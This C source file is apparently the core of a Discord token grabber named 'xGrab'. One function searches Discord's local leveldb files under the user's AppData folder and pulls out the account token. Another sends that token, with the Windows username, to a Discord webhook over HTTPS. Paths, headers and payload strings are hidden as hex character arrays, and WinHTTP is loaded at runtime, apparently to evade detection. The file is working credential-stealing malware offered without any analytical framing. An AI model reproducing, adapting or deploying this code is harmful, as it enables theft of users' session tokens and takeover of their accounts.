#pragma warning( disable: 6386 )

#include "Grabber.h"


LPWSTR getToken() {

	LPWSTR retVal = 0;
	LPWSTR discordLoc = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
	LPWSTR discordLocCat = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
	LPWSTR appdata = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
	WCHAR roamingLoc[] = { 0x5c, 0x44, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x5c, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x20, 0x53, 0x74, 0x6f, 0x72, 0x61, 0x67, 0x65, 0x5c, 0x6c, 0x65, 0x76, 0x65, 0x6c, 0x64, 0x62, 0x5c, 0x2a, 0x00 };
	WCHAR roamingLocCat[] = { 0x5c, 0x44, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x5c, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x20, 0x53, 0x74, 0x6f, 0x72, 0x61, 0x67, 0x65, 0x5c, 0x6c, 0x65, 0x76, 0x65, 0x6c, 0x64, 0x62, 0x5c, 0x00 };
	WIN32_FIND_DATA ffd;
	int readB;

	if (appdata != NULL && discordLoc != NULL) {
		SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);
		
		StringCchCopyW(discordLoc, MAX_PATH * sizeof(WCHAR), appdata);
		StringCchCatW(discordLoc, MAX_PATH * sizeof(WCHAR), roamingLoc);

		HANDLE hFind = FindFirstFileW(discordLoc, &ffd);
		do {
			if ((searchStr(ffd.cFileName, L".log") != NULL || searchStr(ffd.cFileName, L".ldb") != NULL) && discordLocCat != NULL) {
				StringCchCopyW(discordLocCat, MAX_PATH * sizeof(WCHAR), appdata);
				StringCchCatW(discordLocCat, MAX_PATH * sizeof(WCHAR), roamingLocCat);
				StringCchCatW(discordLocCat, MAX_PATH * sizeof(WCHAR), ffd.cFileName);
				HANDLE hFile = CreateFileW(discordLocCat, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
				DWORD fileSize = GetFileSize(hFile, NULL);
				LPVOID fileContent = GlobalAlloc(GMEM_FIXED, fileSize);
				if (hFile != NULL && fileSize != 0 && ReadFile(hFile, fileContent, fileSize, &readB, NULL)) {
					
					LPSTR fileContentCleaned = replace(fileContent, fileSize);
					retVal = extractKey(fileContentCleaned);
					GlobalFree(fileContentCleaned);
				}
				GlobalFree(fileContent);
				if (strl(retVal) == 59) {
					break;
				}
			}
		} while (FindNextFileW(hFind, &ffd) != 0);
	}
	if (retVal == NULL) {
		retVal = GlobalAlloc(GMEM_FIXED, 20);
		StringCchCopyW(retVal, 20, L"FAILED");
	}
	
	GlobalFree(discordLoc);
	GlobalFree(discordLocCat);
	GlobalFree(appdata);
	return retVal;
}

BOOL sendToken(LPWSTR token) {
	
	BOOL retVal = FALSE;
	WCHAR userAgent[] = { 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x33, 0x36, 0x20, 0x28, 0x4b, 0x48, 0x54, 0x4d, 0x4c, 0x2c, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x29, 0x20, 0x43, 0x68, 0x72, 0x6f, 0x6d, 0x65, 0x2f, 0x37, 0x39, 0x2e, 0x30, 0x2e, 0x33, 0x39, 0x34, 0x35, 0x2e, 0x31, 0x31, 0x37, 0x20, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x33, 0x36, 0x00};
	WCHAR domain[] = {0x64, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x2e, 0x63, 0x6f, 0x6d, 0x00};
	WCHAR postParam[] = { 0x75, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x78, 0x47, 0x72, 0x61, 0x62, 0x26, 0x61, 0x76, 0x61, 0x74, 0x61, 0x72, 0x5f, 0x75, 0x72, 0x6c, 0x3d, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x69, 0x2e, 0x69, 0x6d, 0x67, 0x75, 0x72, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x76, 0x71, 0x57, 0x4c, 0x48, 0x49, 0x67, 0x2e, 0x6a, 0x70, 0x67, 0x26, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x3d, 0x00 };
	WCHAR headers[] = { 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e , 0x00};
	WCHAR content1[] = { 0x7b, 0x22, 0x75, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x22, 0x3a, 0x22, 0x78, 0x47, 0x72, 0x61, 0x62, 0x22, 0x2c, 0x20, 0x22, 0x61, 0x76, 0x61, 0x74, 0x61, 0x72, 0x5f, 0x75, 0x72, 0x6c, 0x22, 0x3a, 0x22, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x69, 0x2e, 0x69, 0x6d, 0x67, 0x75, 0x72, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x76, 0x71, 0x57, 0x4c, 0x48, 0x49, 0x67, 0x2e, 0x6a, 0x70, 0x67, 0x22, 0x2c, 0x22, 0x65, 0x6d, 0x62, 0x65, 0x64, 0x73, 0x22, 0x3a, 0x5b, 0x7b, 0x22, 0x74, 0x69, 0x74, 0x6c, 0x65, 0x22, 0x3a, 0x22, 0x4e, 0x65, 0x77, 0x20, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x22, 0x2c, 0x22, 0x63, 0x6f, 0x6c, 0x6f, 0x72, 0x22, 0x3a, 0x22, 0x00};
	WCHAR content2[] = { 0x22, 0x2c, 0x22, 0x66, 0x69, 0x65, 0x6c, 0x64, 0x73, 0x22, 0x3a, 0x5b, 0x7b, 0x22, 0x6e, 0x61, 0x6d, 0x65, 0x22, 0x3a, 0x22, 0x55, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x22, 0x2c, 0x22, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x22, 0x3a, 0x22, 0x00};
	WCHAR content3[] = { 0x22, 0x2c, 0x22, 0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x22, 0x3a, 0x20, 0x74, 0x72, 0x75, 0x65, 0x7d, 0x2c, 0x7b, 0x22, 0x6e, 0x61, 0x6d, 0x65, 0x22, 0x3a, 0x22, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x22, 0x2c, 0x22, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x22, 0x3a, 0x22, 0x00 };
	WCHAR content4[] = { 0x22, 0x7d, 0x5d, 0x7d, 0x5d, 0x7d, 0x00 };
	LPWSTR webhook = L"api/webhooks/...";
	LPWSTR accept[2] = { L"text/plain; charset=utf-8", NULL };
	LPWSTR user = GlobalAlloc(GMEM_FIXED, 100 * sizeof(WCHAR));
	LPWSTR color;
	LPSTR multiByte = 0;
	DWORD size = 100;
	HMODULE winHTTP = LoadLibraryW(L"winhttp.dll");
	GetUserNameW(user, &size);
	LPWSTR postContent = GlobalAlloc(GMEM_FIXED, (275 + strl(user) + strl(token))*sizeof(WCHAR));

	if (strl(token) == 59) {
		color = L"49751";
	}
	else {
		color = L"14876680";
	}

	if (winHTTP != NULL && postContent != NULL && user != NULL) {
		func2 win_http_open = (func2)GetProcAddress(winHTTP, "WinHttpOpen");
		func3 win_http_connect = (func3)GetProcAddress(winHTTP, "WinHttpConnect");
		func4 win_http_open_request = (func4)GetProcAddress(winHTTP, "WinHttpOpenRequest");
		func5 win_http_send_request = (func5)GetProcAddress(winHTTP, "WinHttpSendRequest");
		func6 win_http_close_handle = (func6)GetProcAddress(winHTTP, "WinHttpCloseHandle");
		func7 win_http_receive_response = (func7)GetProcAddress(winHTTP, "WinHttpReceiveResponse");

		StringCchCopyW(postContent, (275 + strl(user) + strl(token)), content1);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), color);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), content2);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), user);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), content3);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), token);
		StringCchCatW(postContent, (275 + strl(user) + strl(token)), content4);

		ULONG cb = 0, cch = (ULONG)strl(postContent);
		cb = WideCharToMultiByte(CP_UTF8, 0, postContent, cch, multiByte, cb, 0, 0);
		multiByte = (PSTR)GlobalAlloc(GMEM_FIXED, cb);
		WideCharToMultiByte(CP_UTF8, 0, postContent, cch, multiByte, cb, 0, 0);
		if (multiByte != NULL) {
			multiByte[cb] = 0;
		}

		HINTERNET hSession = win_http_open(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		HINTERNET hConnect = win_http_connect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
		HINTERNET hRequest = win_http_open_request(hConnect, L"POST", webhook, NULL, WINHTTP_NO_REFERER, accept, WINHTTP_FLAG_SECURE);
		retVal = win_http_send_request(hRequest, headers, strl(headers), multiByte, strl2(multiByte),strl2(multiByte), 0);
		retVal = win_http_receive_response(hRequest, 0);
		win_http_close_handle(hSession);
		win_http_close_handle(hConnect);
		win_http_close_handle(hRequest);

		GlobalFree(multiByte);
		FreeLibrary(winHTTP);

	}
	GlobalFree(postContent);
	GlobalFree(user);

	return retVal;
}
